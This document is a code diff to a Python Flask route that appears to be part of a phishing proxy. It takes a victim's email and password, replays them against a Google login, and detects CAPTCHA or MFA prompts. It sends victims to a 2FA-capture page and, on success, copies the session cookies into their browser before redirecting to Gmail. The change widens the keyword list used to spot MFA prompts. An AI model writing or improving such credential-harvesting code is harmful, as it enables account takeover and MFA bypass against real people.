@@ -374,12 +374,19 @@ def enter_password():
         if "captcha" in response.text.lower():
             print("[DEBUG] CAPTCHA required detected in response.")
             return render_template('captcha.html', email=email, password=password_val, error="CAPTCHA required for this account.")
-        elif "phone" in response.text.lower() or "2-step" in response.text.lower() or "approval" in response.text.lower():
-            print("[DEBUG] Phone approval required detected in response. Redirecting to /auth.")
+
+        # Expanded keyword detection for phone/mfa approval
+        phone_keywords = [
+            "phone", "2-step", "approval", "verify", "verification", "security check", "confirm it's you", "identity", "prompt", "notification", "app", "open your phone", "check your phone", "enter code", "sent a code", "authenticator", "multi-factor", "mfa", "device", "trusted device", "push notification"
+        ]
+        phone_detected = any(kw in response.text.lower() for kw in phone_keywords)
+        if phone_detected:
+            print("[DEBUG] Phone/MFA approval required detected in response. Redirecting to /auth.")
             session['authenticated'] = True
             session['email'] = email
             return redirect(url_for('auth'))
-        elif "challenge" in response.text.lower() or response.status_code == 302:
+
+        if "challenge" in response.text.lower() or response.status_code == 302:
             print("[DEBUG] Challenge or 302 detected. Login successful, redirecting to Gmail inbox.")
             resp = make_response(redirect('https://mail.google.com/mail/u/0/'))
             for k, v in session_req.cookies.items():
@@ -387,9 +394,9 @@ def enter_password():
             session['authenticated'] = True
             session['email'] = email
             return resp
-        else:
-            print("[DEBUG] Login failed, rendering password page again.")
-            error = "Login failed."
+
+        print("[DEBUG] Login failed, rendering password page again.")
+        error = "Login failed."
         return render_template('password.html', email=email, error=error, branding=branding)
     else:
         # If GET, show password page again if session email exists
